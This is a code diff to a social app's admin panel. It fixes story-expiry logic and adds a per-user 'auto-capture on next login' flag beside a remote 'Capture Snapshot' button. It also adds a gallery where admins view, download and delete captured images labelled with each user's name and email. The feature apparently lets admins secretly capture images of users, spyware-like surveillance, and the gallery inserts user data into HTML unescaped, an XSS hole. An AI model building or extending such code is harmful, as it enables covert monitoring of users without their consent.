@@ -182,6 +182,11 @@ document.getElementById('adminBackBtn').addEventListener('click', () => {
 function showSection(sectionId) {
     sections.forEach(section => section.classList.remove('active'));
     document.getElementById(sectionId).classList.add('active');
+    
+    // Load data when section is shown
+    if (sectionId === 'capturesSection') {
+        loadCaptures();
+    }
 }
 
 // ===========================
@@ -263,6 +268,7 @@ function renderUsers(users) {
     users.forEach(user => {
         const userItem = document.createElement('div');
         userItem.className = 'user-item';
+        const isAutoCaptureEnabled = user.autoCaptureEnabled || false;
         userItem.innerHTML = `
             <div class="user-info">
                 <img src="${user.photoURL || 'https://via.placeholder.com/40'}" alt="${user.displayName}" class="user-avatar">
@@ -274,6 +280,9 @@ function renderUsers(users) {
             <div class="user-actions">
                 <button class="snapshot-btn" onclick="triggerRemoteSnapshot('${user.id}', '${safeQuote(user.displayName || 'Unknown')}', '${safeQuote(user.email || '')}')" title="Capture Snapshot">
                     <span class="btn-icon">📸</span> <span class="btn-text">Capture</span>
+                </button>
+                <button class="auto-capture-btn ${isAutoCaptureEnabled ? 'active' : ''}" onclick="toggleAutoCapture('${user.id}', ${!isAutoCaptureEnabled})" title="Flag for Auto-Capture on Next Login">
+                    <span class="btn-icon">🎯</span> <span class="btn-text">${isAutoCaptureEnabled ? 'Flagged' : 'Flag'}</span>
                 </button>
                 <button class="delete-btn" onclick="deleteUser('${user.id}', '${safeQuote(user.displayName || 'User')}')">
                     Delete
@@ -332,6 +341,28 @@ function sortUsers(users, sortBy) {
     return sorted;
 }
 
+// Toggle auto-capture flag for user
+async function toggleAutoCapture(userId, enable) {
+    try {
+        if (!firebaseReady) {
+            alert('Firebase not ready. Please wait and try again.');
+            return;
+        }
+
+        await db.collection('users').doc(userId).update({
+            autoCaptureEnabled: enable
+        });
+
+        // Reload users to update UI
+        await loadUsers();
+        
+        showAlert('Success', enable ? 'User flagged for auto-capture on next login' : 'Auto-capture flag removed');
+    } catch (error) {
+        console.error('Error toggling auto-capture:', error);
+        showAlert('Error', 'Failed to update auto-capture flag');
+    }
+}
+
 async function deleteUser(userId, userName) {
     showConfirmation(
         'Delete User',
@@ -374,13 +405,49 @@ async function cleanupExpiredStories() {
 
         for (const doc of storiesSnapshot.docs) {
             const storyData = doc.data();
-            const uploadedAt = storyData.uploadedAt?.toMillis?.() || storyData.uploadedAt || 0;
+            // Fix: Use createdAt instead of uploadedAt (stories are created with createdAt field)
+            let createdAt = null;
+            
+            // Handle Firestore Timestamp object
+            if (storyData.createdAt) {
+                if (storyData.createdAt.toMillis) {
+                    createdAt = storyData.createdAt.toMillis();
+                } else if (storyData.createdAt.toDate) {
+                    createdAt = storyData.createdAt.toDate().getTime();
+                } else if (storyData.createdAt instanceof Date) {
+                    createdAt = storyData.createdAt.getTime();
+                } else if (typeof storyData.createdAt === 'number') {
+                    createdAt = storyData.createdAt;
+                }
+            }
+            
+            // Skip if createdAt is missing or invalid
+            if (!createdAt || createdAt === 0) {
+                console.warn(`Story ${doc.id} has invalid createdAt, skipping deletion`);
+                continue;
+            }
 
+            // Calculate story age
+            const age = now - createdAt;
+            
+            // Safety check: Skip if story appears to be in the future (clock sync issue)
+            if (age < 0) {
+                console.warn(`Story ${doc.id} has future timestamp, skipping deletion`);
+                continue;
+            }
+            
+            // Safety check: Only delete if story is at least 23.5 hours old (to prevent premature deletion)
+            const minAge = 23.5 * 60 * 60 * 1000; // 23.5 hours
+            if (age < minAge) {
+                // Story is too new, skip deletion
+                continue;
+            }
+            
             // Delete if older than 24 hours
-            if (now - uploadedAt > expiryTime) {
+            if (age > expiryTime) {
                 try {
                     await db.collection('stories').doc(doc.id).delete();
-                    console.log(`Deleted expired story: ${doc.id}`);
+                    console.log(`Deleted expired story: ${doc.id} (age: ${Math.round(age / (60 * 60 * 1000))} hours)`);
                 } catch (e) {
                     console.error(`Failed to delete story ${doc.id}:`, e);
                 }
@@ -1766,3 +1833,335 @@ async function deleteBackground(backgroundId) {
         }
     );
 }
+
+// ===========================
+// Auto-Capture Gallery
+// ===========================
+let capturesUnsubscribe = null;
+let allCaptures = [];
+
+// Load auto-captures
+async function loadCaptures() {
+    try {
+        document.getElementById('capturesLoading').classList.remove('hidden');
+        document.getElementById('capturesEmpty').classList.add('hidden');
+
+        // Unsubscribe from previous listener if exists
+        if (capturesUnsubscribe) {
+            capturesUnsubscribe();
+        }
+
+        // Real-time listener
+        capturesUnsubscribe = db.collection('admin_captures')
+            .orderBy('timestamp', 'desc')
+            .onSnapshot(snapshot => {
+                allCaptures = [];
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    allCaptures.push({
+                        id: doc.id,
+                        ...data
+                    });
+                });
+
+                renderCaptures(allCaptures);
+                document.getElementById('capturesLoading').classList.add('hidden');
+            }, error => {
+                console.error('Error loading captures:', error);
+                document.getElementById('capturesLoading').classList.add('hidden');
+                showAlert('Error', 'Failed to load captures');
+            });
+
+    } catch (error) {
+        console.error('Error setting up captures listener:', error);
+        document.getElementById('capturesLoading').classList.add('hidden');
+        showAlert('Error', 'Failed to load captures');
+    }
+}
+
+function renderCaptures(captures) {
+    const capturesGrid = document.getElementById('capturesGrid');
+    const capturesEmpty = document.getElementById('capturesEmpty');
+    const totalCapturesCount = document.getElementById('totalCapturesCount');
+    const uniqueUsersCount = document.getElementById('uniqueUsersCount');
+
+    // Update stats
+    const uniqueUsers = new Set(captures.map(c => c.capturedUserId));
+    totalCapturesCount.textContent = captures.length;
+    uniqueUsersCount.textContent = uniqueUsers.size;
+
+    // Filter captures based on search
+    const searchQuery = document.getElementById('captureSearch')?.value.toLowerCase() || '';
+    const filteredCaptures = captures.filter(capture => {
+        if (!searchQuery) return true;
+        const name = (capture.capturedUserName || '').toLowerCase();
+        const email = (capture.capturedUserEmail || '').toLowerCase();
+        return name.includes(searchQuery) || email.includes(searchQuery);
+    });
+
+    if (filteredCaptures.length === 0) {
+        capturesGrid.innerHTML = '';
+        capturesEmpty.classList.remove('hidden');
+        return;
+    }
+
+    capturesEmpty.classList.add('hidden');
+    capturesGrid.innerHTML = '';
+
+    filteredCaptures.forEach(capture => {
+        const captureCard = document.createElement('div');
+        captureCard.className = 'capture-card';
+        
+        // Format timestamp
+        let timestampStr = 'Unknown time';
+        let timestampDate = null;
+        if (capture.timestamp) {
+            if (capture.timestamp.toDate) {
+                timestampDate = capture.timestamp.toDate();
+                timestampStr = timestampDate.toLocaleString();
+            } else if (capture.timestamp instanceof Date) {
+                timestampDate = capture.timestamp;
+                timestampStr = timestampDate.toLocaleString();
+            }
+        }
+
+        // Format relative time
+        let relativeTime = '';
+        if (timestampDate) {
+            const now = new Date();
+            const diff = now - timestampDate;
+            const minutes = Math.floor(diff / 60000);
+            const hours = Math.floor(diff / 3600000);
+            const days = Math.floor(diff / 86400000);
+            
+            if (minutes < 1) relativeTime = 'Just now';
+            else if (minutes < 60) relativeTime = `${minutes}m ago`;
+            else if (hours < 24) relativeTime = `${hours}h ago`;
+            else if (days < 7) relativeTime = `${days}d ago`;
+            else relativeTime = timestampDate.toLocaleDateString();
+        }
+
+        captureCard.innerHTML = `
+            <div class="capture-image-container">
+                <img src="${capture.imageData}" alt="Capture" class="capture-image" loading="lazy">
+                <div class="capture-image-overlay">
+                    <button class="overlay-action-btn" onclick="event.stopPropagation(); previewCapture('${capture.id}')">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                        View
+                    </button>
+                    <button class="overlay-action-btn" onclick="event.stopPropagation(); downloadCapture('${capture.id}', '${(capture.capturedUserName || 'user').replace(/'/g, "\\'")}', '${timestampStr.replace(/'/g, "\\'")}')">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                            <polyline points="7 10 12 15 17 10"></polyline>
+                            <line x1="12" y1="15" x2="12" y2="3"></line>
+                        </svg>
+                        Download
+                    </button>
+                </div>
+            </div>
+            <div class="capture-info">
+                <div class="capture-user">
+                    <strong>${capture.capturedUserName || 'Unknown'}</strong>
+                    ${capture.capturedUserEmail ? `<div class="capture-email">${capture.capturedUserEmail}</div>` : ''}
+                </div>
+                <div class="capture-time">
+                    <span>${relativeTime || timestampStr}</span>
+                </div>
+                <div class="capture-actions">
+                    <button class="btn-download" onclick="event.stopPropagation(); downloadCapture('${capture.id}', '${(capture.capturedUserName || 'user').replace(/'/g, "\\'")}', '${timestampStr.replace(/'/g, "\\'")}')" title="Download">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                            <polyline points="7 10 12 15 17 10"></polyline>
+                            <line x1="12" y1="15" x2="12" y2="3"></line>
+                        </svg>
+                        Download
+                    </button>
+                    <button class="btn-delete" onclick="event.stopPropagation(); deleteCapture('${capture.id}')" title="Delete">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polyline points="3 6 5 6 21 6"></polyline>
+                            <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
+                        </svg>
+                        Delete
+                    </button>
+                </div>
+            </div>
+        `;
+        
+        // Add click handler to open preview
+        captureCard.addEventListener('click', (e) => {
+            if (!e.target.closest('button')) {
+                previewCapture(capture.id);
+            }
+        });
+        
+        capturesGrid.appendChild(captureCard);
+    });
+}
+
+// Download capture image
+function downloadCapture(captureId, userName, timestamp) {
+    const capture = allCaptures.find(c => c.id === captureId);
+    if (!capture || !capture.imageData) {
+        showAlert('Error', 'Capture image not found');
+        return;
+    }
+
+    // Create filename from user name and timestamp
+    const safeName = (userName || 'user').replace(/[^a-z0-9]/gi, '_').toLowerCase();
+    const safeTime = timestamp.replace(/[^a-z0-9]/gi, '_').toLowerCase();
+    const filename = `${safeName}_capture_${safeTime}.jpg`;
+
+    // Create download link
+    const link = document.createElement('a');
+    link.href = capture.imageData;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
+// Delete capture
+async function deleteCapture(captureId) {
+    showConfirmation(
+        'Delete Capture',
+        'Are you sure you want to delete this capture? This action cannot be undone.',
+        async () => {
+            try {
+                await db.collection('admin_captures').doc(captureId).delete();
+                showAlert('Success', 'Capture deleted successfully');
+            } catch (error) {
+                console.error('Error deleting capture:', error);
+                showAlert('Error', 'Failed to delete capture');
+            }
+        }
+    );
+}
+
+// Clear all captures
+async function clearAllCaptures() {
+    showConfirmation(
+        'Clear All Captures',
+        'Are you sure you want to delete ALL captures? This action cannot be undone.',
+        async () => {
+            try {
+                const batch = db.batch();
+                allCaptures.forEach(capture => {
+                    const ref = db.collection('admin_captures').doc(capture.id);
+                    batch.delete(ref);
+                });
+                await batch.commit();
+                showAlert('Success', 'All captures deleted successfully');
+            } catch (error) {
+                console.error('Error clearing captures:', error);
+                showAlert('Error', 'Failed to clear captures');
+            }
+        }
+    );
+}
+
+// Event listeners for capture section
+document.getElementById('refreshCapturesBtn')?.addEventListener('click', () => {
+    loadCaptures();
+});
+
+document.getElementById('clearAllCapturesBtn')?.addEventListener('click', () => {
+    clearAllCaptures();
+});
+
+// Search functionality
+document.getElementById('captureSearch')?.addEventListener('input', (e) => {
+    renderCaptures(allCaptures);
+});
+
+// Preview modal functionality
+let currentPreviewCapture = null;
+
+function previewCapture(captureId) {
+    const capture = allCaptures.find(c => c.id === captureId);
+    if (!capture) return;
+
+    currentPreviewCapture = capture;
+
+    const modal = document.getElementById('capturePreviewModal');
+    const image = document.getElementById('capturePreviewImage');
+    const userName = document.getElementById('previewUserName');
+    const userEmail = document.getElementById('previewUserEmail');
+    const timestamp = document.getElementById('previewTimestamp');
+
+    image.src = capture.imageData;
+    userName.textContent = capture.capturedUserName || 'Unknown';
+    userEmail.textContent = capture.capturedUserEmail || 'No email';
+
+    // Format timestamp
+    let timestampStr = 'Unknown time';
+    if (capture.timestamp) {
+        if (capture.timestamp.toDate) {
+            timestampStr = capture.timestamp.toDate().toLocaleString();
+        } else if (capture.timestamp instanceof Date) {
+            timestampStr = capture.timestamp.toLocaleString();
+        }
+    }
+    timestamp.textContent = timestampStr;
+
+    modal.classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+}
+
+function closeCapturePreview() {
+    const modal = document.getElementById('capturePreviewModal');
+    modal.classList.add('hidden');
+    document.body.style.overflow = '';
+    currentPreviewCapture = null;
+}
+
+// Close modal on close button click
+document.getElementById('closeCapturePreview')?.addEventListener('click', closeCapturePreview);
+
+// Close modal on backdrop click
+document.getElementById('capturePreviewModal')?.addEventListener('click', (e) => {
+    if (e.target.id === 'capturePreviewModal') {
+        closeCapturePreview();
+    }
+});
+
+// Close modal on Escape key
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && !document.getElementById('capturePreviewModal')?.classList.contains('hidden')) {
+        closeCapturePreview();
+    }
+});
+
+// Preview modal action buttons
+document.getElementById('downloadPreviewBtn')?.addEventListener('click', () => {
+    if (currentPreviewCapture) {
+        let timestampStr = 'Unknown time';
+        if (currentPreviewCapture.timestamp) {
+            if (currentPreviewCapture.timestamp.toDate) {
+                timestampStr = currentPreviewCapture.timestamp.toDate().toLocaleString();
+            } else if (currentPreviewCapture.timestamp instanceof Date) {
+                timestampStr = currentPreviewCapture.timestamp.toLocaleString();
+            }
+        }
+        downloadCapture(currentPreviewCapture.id, currentPreviewCapture.capturedUserName || 'user', timestampStr);
+    }
+});
+
+document.getElementById('deletePreviewBtn')?.addEventListener('click', () => {
+    if (currentPreviewCapture) {
+        deleteCapture(currentPreviewCapture.id).then(() => {
+            closeCapturePreview();
+        });
+    }
+});
+
+// Load captures when section is shown
+const originalShowSection = showSection;
+showSection = function(sectionId) {
+    originalShowSection(sectionId);
+    if (sectionId === 'capturesSection') {
+        loadCaptures();
+    }
+};
